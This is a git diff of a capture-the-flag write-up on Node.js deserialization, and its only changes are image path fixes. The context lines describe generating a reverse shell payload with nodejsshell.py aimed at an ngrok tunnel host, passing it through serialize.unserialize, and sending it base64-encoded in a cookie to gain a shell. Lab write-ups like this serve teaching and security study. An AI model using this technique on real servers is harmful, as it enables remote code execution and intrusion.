@@ -53,7 +53,7 @@ Now, we can execute a reverse shell payload within the function that would be fi
 
 In my case: `python nodejsshell.py 2.tcp.ngrok.io 13755` allowed me to generate a reverse shell payload for my ngrok tunnel.
 
-![](../.gitbook/assets/image%20%282%29.png)
+![](../../.gitbook/assets/image%20%282%29.png)
 
 Then, we can copy the output into the function body.
 
@@ -65,11 +65,11 @@ serialize.unserialize(payload);
 
 Once we tested that our payload works, we can encode the payload to base 64, and send it through the cookie header.
 
-![](../.gitbook/assets/image%20%286%29.png)
+![](../../.gitbook/assets/image%20%286%29.png)
 
 We obtain a reverse shell, which allows us to read the flag.
 
-![](../.gitbook/assets/image%20%283%29.png)
+![](../../.gitbook/assets/image%20%283%29.png)
 
 ## References:
 
